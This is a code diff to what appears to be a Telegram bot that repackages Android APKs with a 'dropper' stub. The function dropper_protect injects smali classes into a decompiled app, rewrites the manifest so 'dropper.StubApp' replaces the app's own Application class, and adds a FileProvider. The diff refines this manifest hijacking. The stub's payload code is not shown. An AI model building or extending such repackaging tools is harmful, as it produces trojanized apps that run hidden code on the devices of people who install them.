@@ -1,4 +1,4 @@
-import os, json, logging, subprocess, shutil, random, string, uuid, base64
+import os, json, logging, subprocess, shutil, random, string, uuid, base64, re
 from pathlib import Path
 from telegram import Update, Document
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
@@ -35,7 +35,7 @@ def run_cmd(cmd, timeout=300):
 def random_string(length=8):
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
-# --------------- Smali Strings (FIXED) ---------------
+# --------------- Smali Strings (NO BACKSLASH) ---------------
 STUB_APP = """.class public Ldropper/StubApp;
 .super Landroid/app/Application;
 
@@ -223,9 +223,23 @@ def dropper_protect(input_apk: str, output_apk: str) -> bool:
         with open(os.path.join(stub_dir, 'Util.smali'), 'w') as f:
             f.write(STUB_UTIL.replace('__PACKAGE__', package_name))
 
+        # Fix manifest: replace or add android:name without duplicate
         with open(manifest_path, 'r', encoding='utf-8') as f:
             manifest = f.read()
-        manifest = manifest.replace('<application', '<application android:name="dropper.StubApp"')
+
+        # Check if <application> already has android:name
+        if 'android:name=' in manifest.split('<application')[1].split('>')[0]:
+            # Replace existing attribute
+            manifest = re.sub(
+                r'(<application[^>]*?)android:name="[^"]*"',
+                r'\1android:name="dropper.StubApp"',
+                manifest
+            )
+        else:
+            # Add new attribute
+            manifest = manifest.replace('<application', '<application android:name="dropper.StubApp"')
+
+        # Add FileProvider
         provider_entry = '''
         <provider
             android:name="androidx.core.content.FileProvider"
@@ -240,6 +254,7 @@ def dropper_protect(input_apk: str, output_apk: str) -> bool:
         with open(manifest_path, 'w', encoding='utf-8') as f:
             f.write(manifest)
 
+        # Create file_paths.xml
         xml_dir = os.path.join(dec_dir, 'res', 'xml')
         os.makedirs(xml_dir, exist_ok=True)
         with open(os.path.join(xml_dir, 'file_paths.xml'), 'w') as f:
